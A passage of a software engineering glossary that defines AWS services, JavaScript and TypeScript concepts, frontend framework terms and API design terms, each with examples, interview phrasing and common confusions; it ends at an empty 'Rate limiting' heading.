**Practical example:** The ALB SG allows `443` from `0.0.0.0/0`; the app SG allows `8080` only from the ALB SG—no direct public reachability to app ports.

**Interview usage:** Differentiate from NACLs: *“We lean on SGs for coarse segmentation; NACLs are stateless edge supplements.”*

**Common confusion:** Opening wide ingress “temporarily” and forgetting to tighten; SGs are allow-only but humans still open `0.0.0.0/0`.

**Related terms:** NACL, ENI, VPC, [WAF](./04-aws.md)

### S3

**Area:** [AWS](./04-aws.md); storage

**Definition:** Amazon S3 is durably stored object storage addressed by bucket and key with optional prefixes acting like folders. Features include versioning, lifecycle transitions to cheaper classes, replication, server-side encryption, and fine-grained policies (bucket, IAM, ACLs—prefer policy over ACLs). Performance scales with request patterns, but hot prefixes still need careful design.

**Practical example:** Raw uploads land in `s3://lake/ingest/`, lifecycle rules move them to Glacier after 90 days, and cross-region replication guards compliance copies.

**Interview usage:** Speak about consistency and auth: *“We block public ACLs org-wide and gate reads with IAM roles, not hard-coded keys.”*

**Common confusion:** Treating S3 like POSIX FS (no partial writes) or ignoring list costs on huge buckets without delimiter discipline.

**Related terms:** IAM, KMS, CloudFront, EventBridge, Replication

### Lambda

**Area:** [AWS](./04-aws.md); compute

**Definition:** AWS Lambda runs event-driven functions without provisioning servers, billing per millisecond of execution and per invocation. Cold starts happen on new execution environments; memory settings scale CPU proportionally and cap timeout. Concurrency limits per account and per function guard thundering herds but can throttle if unplanned.

**Practical example:** An S3 upload triggers a thumbnail Lambda sized at 1024 MB with a 15s timeout; provisioned concurrency smooths latency for a paywall API on spikes.

**Interview usage:** Balance limits: *“We right-sized memory after profiling; underestimated concurrency caused throttling during marketing events.”*

**Common confusion:** Assuming “serverless means infinite scale”; downstreams and account limits still bottleneck.

**Related terms:** API Gateway, SQS, EventBridge, Step Functions, [ECS](./04-aws.md)

### API Gateway

**Area:** [AWS](./04-aws.md); integration edge

**Definition:** Amazon API Gateway fronts REST, HTTP, or WebSocket APIs with managed routing to backends such as Lambda, [ECS](./04-aws.md), or VPC links. It offers throttling quotas, API keys (where appropriate), IAM/Cognito authorizers, request validation, and caching at additional cost. It abstracts TLS, logging to CloudWatch, and stage-based rollouts.

**Practical example:** `/v1/orders` maps to a Lambda with 1000 RPS burst limits and Cognito JWT validation; websockets fan out to DynamoDB streams via a separate route selection.

**Interview usage:** Compare to ALB: *“We chose API Gateway when we needed usage plans and authorizers; ALB for long-lived TCP or simpler pathing.”*

**Common confusion:** Ignoring latency overhead of heavy mapping templates or mispricing per-million requests vs data transfer.

**Related terms:** Lambda, Cognito, CloudWatch, Usage plan, VPC link

### ECS

**Area:** [AWS](./04-aws.md); containers

**Definition:** Amazon Elastic Container Service orchestrates Docker containers on AWS, integrating IAM, networking, and load balancing. Launch types include Fargate (AWS manages servers) versus EC2 (you manage capacity and patching). Task definitions describe images, CPU/memory, env, and sidecars; services maintain desired counts and deployments.

**Practical example:** A Fargate service sits behind an ALB with awsvpc networking; tasks pull images from ECR using an execution role.

**Interview usage:** Contrast with [EKS](./04-aws.md): *“We picked ECS for simpler ops with deep AWS integration; EKS when we needed portable Kubernetes.”*

**Common confusion:** Mixing bridge networking assumptions from local Docker with `awsvpc` ENI limits per subnet.

**Related terms:** Fargate, EC2, ECR, ALB, [Docker and Kubernetes](./03-docker-and-kubernetes.md)

### EKS

**Area:** [AWS](./04-aws.md); [Docker and Kubernetes](./03-docker-and-kubernetes.md)

**Definition:** Amazon Elastic Kubernetes Service runs upstream-compatible Kubernetes with a managed control plane (API server, etcd, scheduler) and your choice of worker nodes (managed node groups, self-managed EC2, Fargate profiles). Integration covers IAM for authn/authz mapping, VPC CNI pod networking, and load balancer controllers.

**Practical example:** GitOps applies manifests to EKS; AWS Load Balancer Controller provisions ALBs from Ingress objects; cluster autoscaling adds nodes when Pending pods appear.

**Interview usage:** Clarify shared responsibility: *“AWS patches the control plane; we still own worker OS, add-ons, and RBAC hygiene.”*

**Common confusion:** Believing “managed” removes all upgrades—node AMI cycles and API deprecations remain customer work.

**Related terms:** VPC CNI, IRSA, ALB, kubectl, [ECS](./04-aws.md)

### RDS

**Area:** [AWS](./04-aws.md); databases

**Definition:** Amazon Relational Database Service provisions managed engines (PostgreSQL, MySQL, Aurora, others) with automated backups, patching windows, parameter groups, and Multi-AZ synchronous failover for resilience. Read replicas scale read traffic and can promote during disasters; storage autoscaling helps growth without manual disk ops.

**Practical example:** A Multi-AZ Postgres backs an ecommerce core; read replicas offload reporting; snapshots ship to another region for DR drills.

**Interview usage:** Talk ops realism: *“We rehearse failover; Multi-AZ is not a substitute for backup testing or connection pool sizing.”*

**Common confusion:** Treating replicas as free high availability for writes—they serve reads; failover semantics differ by engine.

**Related terms:** Aurora, Parameter group, Subnet group, Secrets Manager, read replica

### DynamoDB

**Area:** [AWS](./04-aws.md); NoSQL

**Definition:** DynamoDB is a managed key-value and document store that partitions data by a partition key (and optional sort key) for horizontal scale. Secondary indexes (GSI for alternate access patterns, LSI constrained to same partition key) must be designed up front; hot partitions throttle if key choice is poor. Capacity modes split on-demand (pay per request) from provisioned (RCU/WCU with autoscaling).

**Practical example:** A session store uses `userId` as partition key and `sessionId` sort key; a GSI on `tenantId` supports admin queries without table scans.

**Interview usage:** Show modeling chops: *“We avoided celebrity hot keys by sharding high-traffic tenants across synthetic key suffixes.”*

**Common confusion:** Expecting ad hoc relational joins; patterns require denormalization or ancillary stores.

**Related terms:** Streams, GSI, LSI, DAX, PartiQL

### SQS

**Area:** [AWS](./04-aws.md); messaging

**Definition:** Amazon Simple Queue Service is a managed queue with at-least-once delivery in standard queues or strict ordering and deduplication in FIFO queues named with `.fifo`. Visibility timeout hides messages during processing; dead-letter queues capture poison messages for triage. Throughput and ordering tradeoffs guide standard versus FIFO choice.

**Practical example:** Order events land in a standard queue consumed by Lambda with batching; failed messages exhaust retries then route to a DLQ alarmed in CloudWatch.

**Interview usage:** Stress idempotency: *“Because SQS can duplicate, consumers dedupe with natural keys stored in DynamoDB.”*

**Common confusion:** Thinking FIFO removes all duplicates—it dedupes within a five-minute window by design.

**Related terms:** SNS, Lambda, EventBridge, DLQ, visibility timeout

### EventBridge

**Area:** [AWS](./04-aws.md); event-driven integration

**Definition:** EventBridge is a serverless event bus that matches events with rules and routes them to targets such as Lambda, SQS, Step Functions, or SaaS integrations. Default buses versus custom buses organize domains; schema registry documents event shapes. Content filtering reduces fanout noise compared to blind SNS topics.

**Practical example:** `OrderPlaced` events from a custom bus trigger three rules—billing Lambda, analytics Firehose, and partner integration—each with distinct input transformers.

**Interview usage:** Differentiate from SNS/SQS: *“EventBridge shines when we need pattern matching and SaaS sources with a unified bus.”*

**Common confusion:** Assuming guaranteed ordering globally; per-rule targets have different semantics and retries.

**Related terms:** SQS, SNS, Lambda, Schema registry, Pipe

### CloudWatch

**Area:** [AWS](./04-aws.md); observability

**Definition:** Amazon CloudWatch collects metrics (default service metrics and custom via embedded metric format or API), aggregates logs via log groups/streams, and drives alarms on thresholds or anomaly detection. Dashboards visualize operational health; Contributor Insights spots hot keys. It integrates tightly with Lambda, [ECS](./04-aws.md), and API Gateway for request traces when paired with X-Ray.

**Practical example:** An alarm on `ApproximateAgeOfOldestMessage` for an SQS queue pages on-call; log insights queries trace error spikes after a deploy.

**Interview usage:** Mention cost: *“We tuned log retention and sampling so high-cardinality custom metrics did not explode billing.”*

**Common confusion:** Expecting Honeycomb-style tracing from logs alone—without structure, log search stays painful.

**Related terms:** X-Ray, Alarms, Logs Insights, Metric filter, SNS

### KMS

**Area:** [AWS](./04-aws.md); cryptography

**Definition:** AWS Key Management Service hosts customer master keys (CMKs) as hardware-backed or imported material, enforcing IAM policies and optional automatic rotation for AWS-managed symmetric keys. Envelope encryption uses a data key to encrypt payloads locally while KMS encrypts the small key blob. Audit trails land in CloudTrail.

**Practical example:** S3 SSE-KMS encrypts objects with per-request data keys; Lambda decrypts via IAM role permission on the CMK alias.

**Interview usage:** Separate responsibilities: *“KMS guards key usage, not your app logic; we still need TLS in transit and rotation runbooks.”*

**Common confusion:** Blaming KMS latency for all slowdowns—batch and cache decrypted keys where safe.

**Related terms:** CloudTrail, S3, Secrets Manager, IAM, envelope encryption

### WAF

**Area:** [AWS](./04-aws.md); edge security

**Definition:** AWS WAF filters HTTP(S) traffic at the edge when attached to CloudFront, ALB, API Gateway, or App Runner, using managed rule groups (baseline OWASP coverage, bot control) and custom rules for IP allow/block, geo match, rate limiting, and body inspection. Logging feeds S3 or Kinesis for forensics; rule evaluation order matters for latency.

**Practical example:** A rate-based rule caps login POSTs per IP while a managed rule group blocks known bad signatures before traffic hits [ECS](./04-aws.md) tasks.

**Interview usage:** Pair with app defenses: *“WAF absorbs noise; we still validate input in services and patch dependencies.”*

**Common confusion:** Enabling every managed rule without tuning—false positives can block legit customers.

**Related terms:** CloudFront, ALB, Shield, Rule group, Rate-based rule

## JavaScript and TypeScript

### Event loop

**Area:** [JavaScript](./05-javascript.md) / runtime model

**Definition:** The event loop is how JavaScript runtimes schedule work on a single call thread: synchronous code runs to completion on the call stack, and when the stack is empty the runtime pulls the next task from macrotask queues (timers, I/O, UI) or drains the microtask queue. Microtasks run before the next macrotask, which is why `Promise.then` callbacks can run before a `setTimeout` scheduled in the same turn.

**Practical example:** In a [Node.js](./10-nodejs.md) HTTP handler, you return a response after `await` resolves; meanwhile other requests interleave because awaits yield and the event loop picks up other work.

**Interview usage:** You might say: “I reason about latency and ordering by separating macrototasks from microtasks—e.g. I avoid assuming timer order relative to promise resolution without checking.”

**Common confusion:** People treat “async” as extra threads; it is cooperative concurrency on one thread unless you use workers or native parallel APIs.

**Related terms:** Microtask, [Promise](#promise), call stack, macrotask

**Tech Lead note:** Misunderstanding the event loop leads to flaky UI, surprising batching, and wrong assumptions about parallel I/O—worth grounding the team with a short runtime model review before hard performance work.

### Microtask

**Area:** [JavaScript](./05-javascript.md) / scheduling

**Definition:** A microtask is a high-priority job queued to run after the current synchronous JavaScript finishes and before the next macrotask. Promises schedule microtasks via `.then`/`.catch`/`.finally`; `queueMicrotask` does the same explicitly. The runtime drains the microtask queue until it is empty, which can starve rendering or deep-stack if chained microtasks recurse without yielding.

**Practical example:** Logging order: synchronous code, then all settled promise reactions, then a `setTimeout(0)` callback—useful when debugging “why did this run first?” in [React](./08-react.md) effects versus promise chains.

**Interview usage:** Say: “I treat microtasks as ‘end of this turn’ work—I use them for consistent ordering but stay aware of starvation when chaining many reactions.”

**Common confusion:** Assuming `setTimeout(0)` and `Promise.resolve().then(...)` order the same way; microtasks always run first.

**Related terms:** Event loop, [Promise](#promise), macrotask

### Closure

**Area:** [JavaScript](./05-javascript.md) / scoping

**Definition:** A closure is a function bundled with the lexical environment it was created in, so inner functions retain access to outer variables even after the outer function returns. That enables encapsulation, factory patterns, and stable callbacks—but also accidental retention of large objects if closures capture more than needed.

**Practical example:** A module exporting `createCounter()` that returns `{ inc, get }` hides `count` via closure; event listeners in [Angular](./07-angular.md) or [React](./08-react.md) often close over props/state from the render where they were registered.

**Interview usage:** “I watch closure capture in hooks and subscriptions—stale closures are a common bug when dependencies are wrong or callbacks are memoized incorrectly.”

**Common confusion:** Thinking closures copy values at creation time; they hold live bindings to outer variables unless you rebind per call (e.g. loop `let` vs `var`).

**Related terms:** Lexical scope, callback, module pattern

### Prototype chain

**Area:** [JavaScript](./05-javascript.md) / objects

**Definition:** JavaScript resolves property reads by walking a linked chain of objects: the object itself, then its prototype, then that object’s prototype, until `null`. `Object.create(proto)` sets the link explicitly; classes desugar to prototype wiring. Writes create or shadow own properties unless setters exist on the chain.

**Practical example:** Extending built-ins or sharing methods across “instances” without copying them uses the prototype; libraries polyfilling methods rely on chain semantics.

**Interview usage:** “When debugging ‘missing’ properties I verify whether they live on the instance or the prototype, and whether enumeration includes inherited keys.”

**Common confusion:** Confusing `__proto__` with `prototype`—the former is an object’s link upward; the latter is a constructor’s object used as `__proto__` for instances.

**Related terms:** `Object.create`, class syntax, inheritance

### Promise

**Area:** [JavaScript](./05-javascript.md) / asynchronous programming

**Definition:** A Promise is an object representing the eventual completion or failure of an asynchronous operation, with states pending, fulfilled, or rejected. `.then` chains transform values and propagate errors; `async/await` is syntax over the same machinery. Combinators like `Promise.all` express concurrency and failure modes explicitly.

**Practical example:** Fetching JSON in the browser or wrapping [Node.js](./10-nodejs.md) `fs.promises` returns promises you combine with `Promise.allSettled` when partial success is acceptable.

**Interview usage:** “I default to explicit error boundaries—unhandled rejections still happen if someone forgets `await` or `.catch`.”

**Common confusion:** Believing `.catch` on a branch fixes upstream parallel failures; with `Promise.all`, one rejection rejects the whole aggregate unless you use `allSettled` or normalize errors.

**Related terms:** [async/await](#asyncawait), microtask, `fetch`

**Tech Lead note:** Promise hygiene (logging, cancellation strategy, aggregation) scales as a code review theme across teams touching [API Design](./12-api-design.md) clients.

### async/await

**Area:** [JavaScript](./05-javascript.md) / asynchronous programming

**Definition:** `async` functions always return a Promise; `await` pauses the async function until a thenable settles, yielding the thread back to the event loop. Sequential `await` is easy to read but can serialize I/O unnecessarily; `Promise.all` keeps concurrency explicit. `await` in non-async contexts is a syntax error in JS; in [TypeScript](./06-typescript.md) it additionally interacts with type inference on return types.

**Practical example:** A route handler in [Next.js](./09-nextjs.md) that awaits a database call looks linear while still allowing other requests to run between awaits.

**Interview usage:** “I parallelize independent awaits with `Promise.all` and keep try/catch around the smallest scope that can fail meaningfully.”

**Common confusion:** Assuming `async` makes code parallel—it makes syntax linear; parallelism still requires combining independent operations.

**Related terms:** [Promise](#promise), event loop, try/catch

### Type narrowing

**Area:** [TypeScript](./06-typescript.md) / type system

**Definition:** Narrowing is TypeScript’s control-flow analysis refining a union or broad type to a smaller set inside branches. Guards include `typeof`, `instanceof`, truthiness checks, equality on literals, discriminated property checks, and user-defined type predicates. Narrowing is lexical and can reset across function boundaries unless captured in a `const` or parameter narrowing pattern.

**Practical example:** After `if (value.kind === 'user')`, TS treats `value` as the user variant in that block—common with [API](./12-api-design.md) payloads that carry a `type` discriminator.

**Interview usage:** “I prefer discriminated unions at API boundaries so narrowing stays mechanical and exhaustive checking becomes possible.”

**Common confusion:** Expecting narrowing to cross asynchronous gaps without re-checking; captured variables may widen again unless annotated or narrowed inline after await.

**Related terms:** [Discriminated union](#discriminated-union), type guard, control flow analysis

### Generic

**Area:** [TypeScript](./06-typescript.md) / type system

**Definition:** Generics parameterize types and functions with type variables (e.g. `List<T>`), preserving relationships between inputs and outputs instead of erasing to `any`. Constraints (`extends`) and defaults bound flexibility. They enable reusable utilities—sort keys, mappers, caches—without sacrificing safety.

**Practical example:** A `Result<T, E>` type or `useState<number>` in [React](./08-react.md) ties state shape to callers.

**Interview usage:** “I reach for generics when the algorithm is the same but the type varies—otherwise unions or overloads get noisy.”

**Common confusion:** Over-genericizing APIs so inference breaks and call sites need explicit type arguments everywhere.

**Related terms:** Constraint, inference, variance (conceptual)

### Discriminated union

**Area:** [TypeScript](./06-typescript.md) / modeling

**Definition:** A discriminated union is a union of object types sharing a common literal property (the discriminant, often `kind`, `type`, or `status`) whose value identifies the variant. Switching on the discriminant lets the compiler narrow each branch and supports exhaustiveness checking with `never`.

**Practical example:** Redux actions, websocket messages, or [GraphQL](#graphql) union results modeled as `{ type: 'A'; ... } | { type: 'B'; ... }`.

**Interview usage:** “At system boundaries I use discriminated unions instead of optional blobs so invalid states don’t type-check.”

**Common confusion:** Using a non-literal or runtime-widened discriminant so TS cannot narrow reliably.

**Related terms:** [Type narrowing](#type-narrowing), [never](#never), exhaustiveness checking

### unknown vs any

**Area:** [TypeScript](./06-typescript.md) / safety trade-offs

**Definition:** `unknown` is the top type that forces you to narrow or assert before use—safe default for external input. `any` opts out of checking and poisons inference, disabling many guarantees. Prefer `unknown` plus guards at boundaries; reserve `any` for incremental migration with tight scope and follow-up tickets.

**Practical example:** `JSON.parse` returns `unknown`; parsers in adapters narrow into domain types before passing inward.

**Interview usage:** “My rule is `unknown` at the edge, domain types inside; `any` needs a comment and an expiration plan.”

**Common confusion:** Thinking `unknown` is “like any but nicer”—it is stricter, not interchangeable at use sites.

**Related terms:** Type guard, assertion, gradual typing

### never

**Area:** [TypeScript](./06-typescript.md) / type system

**Definition:** `never` represents values that cannot exist—unreachable code, exhaustive switches that should have handled every case, or functions that always throw. Assignability rules make `never` the bottom type: everything assigns to `never` except in error positions; `never` assigns to everything in soundness checks for exhaustiveness.

**Practical example:** A `assertNever(x: never)` helper fails compile-time when a new union variant is added but not handled.

**Interview usage:** “I use `never` in default branches to turn ‘forgot a case’ into a compile error instead of a silent fall-through.”

**Common confusion:** Using `never` for “void functions”—`void` is the absence of a useful return; `never` means no return at all.

**Related terms:** [Discriminated union](#discriminated-union), exhaustive switch, bottom type

### Hoisting

**Area:** [JavaScript](./05-javascript.md) / execution

**Definition:** Hoisting is the compile-phase behavior where declarations are registered in their scope before statements run. `var` bindings exist for the whole function scope and initialize as `undefined` until assigned. `let` and `const` hoist too but live in the temporal dead zone (TDZ)—access before the declaration throws `ReferenceError`. Function declarations hoist fully; `const fn = () => {}` follows `const` rules.

**Practical example:** Legacy bundles or sloppy ordering in scripts can read `var`-declared config as `undefined` at top of file; TDZ errors appear when referencing class fields or `let` loop indices too early.

**Interview usage:** “I standardize on `const`/`let`, avoid `var`, and keep declarations above use so TDZ surprises don’t show up in reviews.”

**Common confusion:** Believing only `var` hoists—`let`/`const` hoist but are unusable until initialized.

**Related terms:** Temporal dead zone, scope, function declaration

## Frontend Frameworks

### Component

**Area:** UI architecture ([React](./08-react.md), [Angular](./07-angular.md), etc.)

**Definition:** A component encapsulates structure (template/JSX), behavior (hooks, lifecycle, events), and styling into a reusable unit with a clear boundary. Composition over inheritance is the norm; components communicate downward via [props](#props) and upward via callbacks or events. Good boundaries limit blast radius when requirements change.

**Practical example:** A `DataTable` in an admin app wraps sorting, pagination hooks, and accessibility semantics while consuming row render props or content projection slots.

**Interview usage:** “I split components by responsibility—container vs presentational—when data-fetching and rendering concerns fight.”

**Common confusion:** Giant components that also own routing, global state, and incidentals—hard to test and reuse.

**Related terms:** [Props](#props), [State](#state), composition

### Props

**Area:** [React](./08-react.md) / [Angular](./07-angular.md) inputs

**Definition:** Props (or Angular `@Input`s) are read-only data parents supply to children. Immutability at the level of “don’t mutate parent-owned objects in place” preserves predictable rendering. Typing props tightly catches integration bugs early.

**Practical example:** Passing `userId` and `onSelect` into a list item; the child invokes the callback instead of mutating global state.

**Interview usage:** “I treat props as contracts—wide optional bags become debt; I narrow them as the API stabilizes.”

**Common confusion:** Mutating prop objects to “sync” with parent state, which breaks change detection and memoization.

**Related terms:** [Component](#component), [State](#state), callback props

### State

**Area:** Frontend data ownership

**Definition:** State is mutable data owned by a component (or store) that affects rendering when it changes. Local state handles UI-only concerns; lifted state coordinates siblings; global stores handle cross-cutting domains. The framework maps state updates to DOM or other outputs via its reactivity model.

**Practical example:** A modal’s `open` flag lives in local state; auth profile may live in context or NgRx/Redux depending on breadth of use.

**Interview usage:** “I decide state placement by who must react—if only one subtree cares, I keep it local to cut coupling.”

**Common confusion:** Storing derived data that could be computed from props/state, causing sync bugs on updates.

**Related terms:** [Hook](#hook), [Signal](#signal), derived state

### Hook

**Area:** [React](./08-react.md) / function components

**Definition:** Hooks are functions whose names start with `use` that let function components hold state, subscribe to lifecycle-like phases, and reuse logic (`useState`, `useEffect`, `useMemo`, `useContext`). Rules of Hooks require calling them unconditionally at the top level so call order stays stable—deviations break internal fiber bookkeeping.

**Practical example:** `useEffect` subscribing to a websocket and cleaning up on unmount; custom `useDebounce` shared across screens.

**Interview usage:** “I audit hook dependency arrays—missing deps cause stale data; exhaustive-deps lint is a baseline.”

**Common confusion:** Using hooks inside loops or conditions, which violates ordering invariants.

**Related terms:** [Reconciliation](#reconciliation), custom hook, [Component](#component)

### Reconciliation

**Area:** [React](./08-react.md) / rendering

**Definition:** Reconciliation is React’s process of diffing the previous and next element trees to compute minimal updates to the real DOM (or native views). Keys identify stable siblings in lists; wrong keys cause remounts and state loss. The algorithm favors predictable structure over perfect optimality.

**Practical example:** Adding `key={id}` to dynamic rows prevents input focus jumping when sorts change.

**Interview usage:** “When lists jitter, I verify keys and structural stability before reaching for manual memo everywhere.”

**Common confusion:** Assuming the virtual DOM means “no performance work”—large lists and expensive renders still need profiling and memo discipline.

**Related terms:** Virtual DOM, key prop, React Fiber

### Hydration

**Area:** SSR ([Next.js](./09-nextjs.md), etc.)

**Definition:** Hydration attaches client-side event handlers and framework state to HTML produced on the server. Mismatches between server markup and the client’s first render cause errors or subtle UI bugs. Progressive or partial hydration strategies trade interactivity for bundle size.

**Practical example:** [Next.js](./09-nextjs.md) streams HTML, then hydrates route segments; islands architectures hydrate only interactive regions.

**Interview usage:** “I watch for non-deterministic renders (dates, random IDs) that break SSR/hydration parity.”

**Common confusion:** Thinking SSR removes the need for client rendering—it shifts where first paint happens, not the eventual client model.

**Related terms:** [Server component](#server-component), SSR, mismatch

**Tech Lead note:** Hydration bugs often appear at organizational boundaries (design vs data); agreeing on deterministic rendering rules saves production fire drills.

### Server component

**Area:** [React](./08-react.md) / [Next.js](./09-nextjs.md)

**Definition:** Server components render exclusively on the server, can access backend resources directly, and ship no client bundle for their logic. They compose with client components at boundaries marked for interactivity. Data fetching colocates with UI without exposing secrets to the browser.

**Practical example:** A product details page fetches from a DB in a server component, passing serializable props to a small client chart component.

**Interview usage:** “I put data access and heavy transforms server-side, client components only where hooks or events require the browser.”

**Common confusion:** Using browser-only APIs or hooks inside server components, or expecting them to re-render on every client navigation without understanding the framework’s caching model.

**Related terms:** [Hydration](#hydration), RSC, client component

### Signal

**Area:** Fine-grained reactivity ([Angular](./07-angular.md), Solid, Preact Signals)

**Definition:** A signal is a reactive cell: reading it tracks dependents, writing it schedules targeted updates. Unlike coarse virtual DOM diffs for every tree walk, signal-based systems often update only affected DOM nodes. Signals compose via computed readers and explicit effects.

**Practical example:** [Angular](./07-angular.md) signals drive `computed()` derivations and `effect()` side workflows with explicit dependency tracking.

**Interview usage:** “I compare signals vs VDOM reconciliation for our UI complexity—signals shine when updates are localized and frequent.”

**Common confusion:** Treating signals exactly like React state without learning their laziness, equality, and effect semantics.

**Related terms:** [Observable](#observable), memoization, reactivity graph

### Observable

**Area:** [Angular](./07-angular.md) / RxJS

**Definition:** An observable is a lazy push stream emitting zero to many values, optionally ending with completion or error. Operators (`map`, `switchMap`, `catchError`) compose async flows declaratively; `subscribe` begins execution. Hot vs cold observables differ on whether each subscriber triggers work.

**Practical example:** HTTP calls in Angular return observables; `switchMap` cancels in-flight searches when queries change.

**Interview usage:** “I manage subscription lifecycles with `takeUntil` or `async` pipe to avoid leaks in routed components.”

**Common confusion:** Equating observables with promises—observables are multi-valued and cancellable; promises are single-shot.

**Related terms:** [Signal](#signal), Subject, marble diagrams

### Reactive form

**Area:** [Angular](./07-angular.md) / forms

**Definition:** Reactive forms model inputs with explicit `FormControl`, `FormGroup`, and `FormArray` objects in TypeScript, separate from the template except for bindings. Validators run synchronously or asynchronously; value and status streams integrate cleanly with RxJS when needed. Dynamic fields map to arrays of controls programmatically.

**Practical example:** A multi-step wizard adds/removes address lines by mutating a `FormArray`, with custom validators enforcing postal formats.

**Interview usage:** “I pick reactive forms when validation logic is complex or shared—template forms for very simple, mostly static inputs.”

**Common confusion:** Mixing reactive and template-driven patterns in the same control without a single source of truth.

**Related terms:** `FormControl`, validator, valueChanges

## Backend and API Design

### Middleware

**Area:** HTTP servers ([Node.js](./10-nodejs.md), frameworks)

**Definition:** Middleware functions sit in the request/response pipeline, running in sequence with `(req, res, next)` (or framework equivalents). They handle cross-cutting tasks—authentication, logging, parsing, compression, error mapping—before handlers run. Order matters: auth before business logic, error middleware last.

**Practical example:** Express-style stacks in [Node.js](./10-nodejs.md) add JSON parsing, then session validation, then route [controllers](#controller).

**Interview usage:** “I keep middleware focused and side-effect explicit; fat middleware becomes an untestable god pipeline.”

**Common confusion:** Assuming async middleware errors propagate automatically—many frameworks require `next(err)` or try/finally wrappers.

**Related terms:** [Controller](#controller), pipeline, aspect-oriented concerns

### Controller

**Area:** Web layer / routing

**Definition:** A controller maps HTTP routes and verbs to application actions, validates or adapts input, calls domain services, and shapes HTTP responses with correct status codes. It stays thin—business rules belong in services to stay testable without HTTP mocks everywhere.

**Practical example:** `POST /orders` validates a [DTO](#dto-data-transfer-object), invokes `OrderService.create`, returns 201 with location header.

**Interview usage:** “If a controller grows validation plus orchestration plus persistence, I extract a service and leave HTTP concerns at the edge.”

**Common confusion:** Encoding domain invariants only in controllers, which breaks reuse for CLI jobs or message consumers hitting the same rules.

**Related terms:** [Middleware](#middleware), [DTO (Data Transfer Object)](#dto-data-transfer-object), routing

### Dependency injection

**Area:** Application architecture

**Definition:** Dependency injection supplies collaborators (DB clients, clocks, policies) from outside instead of constructing them inside a class. Containers (NestJS, Angular DI, Spring-style) resolve graphs by token or type, enabling swaps in tests and configuration-driven wiring.

**Practical example:** A payment service receives a `PaymentGateway` interface; tests inject a fake that records calls without network I/O.

**Interview usage:** “I inject side effects at the edge—time, randomness, IO—so domain logic stays deterministic under test.”

**Common confusion:** Service locator patterns disguised as DI—global registries hide dependencies and worsen test setup.

**Related terms:** Inversion of control, provider, test doubles

**Tech Lead note:** DI discipline correlates with team velocity on large services; it is a review-level architecture habit, not a solo preference.

### DTO (Data Transfer Object)

**Area:** [API Design](./12-api-design.md) / layering

**Definition:** A DTO shapes data crossing layer or network boundaries—request bodies, responses, queue messages—without exposing internal entity graphs or ORM quirks. Mapping between entities and DTOs isolates versioning and field renaming from persistence models.

**Practical example:** Exposing `{ displayName, avatarUrl }` while the database stores normalized profile tables and internal flags.

**Interview usage:** “I never leak ORM models through public APIs; DTOs let me evolve storage without client churn.”

**Common confusion:** Using DTOs as domain entities with behavior—they should stay transport-focused unless you adopt richer patterns deliberately.

**Related terms:** Mapper, [REST](#rest), [GraphQL](#graphql) types

### REST

**Area:** [API Design](./12-api-design.md) / HTTP APIs

**Definition:** REST centers resources identified by URLs, manipulated with HTTP methods (GET safe, POST create, PUT/ PATCH update, DELETE remove), status codes expressing outcomes, and stateless servers scaling horizontally. HATEOAS is idealized; many “REST-ish” APIs are pragmatic JSON over HTTP with consistent nouns and verbs.

**Practical example:** `GET /users/{id}` returns 200 or 404; `409` signals conflicting updates; caching uses `ETag` headers on reads.

**Interview usage:** “I align verbs and status codes with semantics—misused 200 on errors breaks clients and monitoring.”

**Common confusion:** CRUD mapped blindly without idempotency or concurrency stories—REST is not “no design work.”

**Related terms:** [Idempotency](#idempotency), HTTP semantics, resource modeling

### GraphQL

**Area:** [API Design](./12-api-design.md) / query APIs

**Definition:** GraphQL is a typed schema and query language where clients request exactly the fields they need over a single endpoint. Resolvers fetch data; the execution engine batches and shapes responses. Introspection powers tooling; complexity limits and depth guards address abuse.

**Practical example:** A mobile app queries nested author and comments in one round trip while a web admin requests a thinner projection.

**Interview usage:** “I weigh GraphQL when clients diverge and over-fetching hurts; I add rate limits and query cost analysis early.”

**Common confusion:** Treating GraphQL as “no versioning”—schema evolution still needs discipline (deprecation, usage analytics).

**Related terms:** [REST](#rest), resolver, N+1 problem, dataloaders

### WebSocket

**Area:** Real-time systems

**Definition:** WebSockets upgrade an HTTP connection to a full-duplex TCP channel framed for messages, enabling push from server to client without polling. Heartbeats, backpressure, and auth on upgrade are production concerns; sticky sessions or pub/sub bridges appear at scale.

**Practical example:** Collaborative editors, live dashboards, or game state streams push JSON events after a WS handshake.

**Interview usage:** “I pair WebSockets with reconnect/backoff strategies and clear message schemas so clients stay resilient.”

**Common confusion:** Using WS for everything HTTP could solve—stateless request/response remains simpler for many CRUD flows.

**Related terms:** [Webhook](#webhook) (different delivery model), STOMP, SSE

### Webhook

**Area:** Integrations / callbacks

**Definition:** A webhook is an outbound HTTP request a provider sends to your endpoint when an event occurs—push integration instead of polling. Security uses signatures, timestamp tolerance, and replay protection; reliability uses [idempotency](#idempotency) keys and retries with deduplication.

**Practical example:** Stripe notifies your [Node.js](./10-nodejs.md) service on `payment_intent.succeeded`; you verify the signature header before fulfilling orders.

**Interview usage:** “I treat webhooks as untrusted until verified—signature mismatch is a hard 400, not a silent log.”

**Common confusion:** Assuming order of delivery matches event time—network retries reorder; design handlers accordingly.

**Related terms:** HMAC verification, [Idempotency](#idempotency), event sourcing (related at scale)

### Idempotency

**Area:** Reliability / [API Design](./12-api-design.md)

**Definition:** An operation is idempotent if repeating it with the same inputs leaves the system in the same state as doing it once—critical for retries, webhooks, and payment APIs. Clients send idempotency keys; servers dedupe within a window or store outcomes keyed by token.

**Practical example:** Charging a card twice with the same key returns the original charge record, not double spend.

**Interview usage:** “I require idempotency keys on mutating endpoints that sit behind flaky networks or user double-clicks.”

**Common confusion:** Thinking GET idempotency covers POST—POST create is only idempotent with explicit server-side dedupe.

**Related terms:** Retry, exactly-once (goal), [Webhook](#webhook)

**Tech Lead note:** Idempotency is where product promises meet billing reality—prioritize it before scaling revenue paths.

### Pagination

**Area:** [API Design](./12-api-design.md) / data access

**Definition:** Pagination splits large result sets across responses. Offset/limit is simple but degrades on deep pages due to scanning; cursor/keyset pagination tracks an opaque marker for stable, efficient next pages under churn. Include sort keys in cursors to avoid duplicates or gaps when data mutates mid-walk.

**Practical example:** Twitter-style timelines use cursors; admin tables with rare deep paging might accept offset for simplicity with indexed sorts.

**Interview usage:** “For high-churn feeds I choose cursor pagination; for static exports I document totals and stable sorts explicitly.”

**Common confusion:** Returning unstable pages when rows insert/delete between offset requests—users see skips or repeats.

**Related terms:** Cursor, limit/offset, consistency

### Rate limiting

**Area:** API operations / resilience

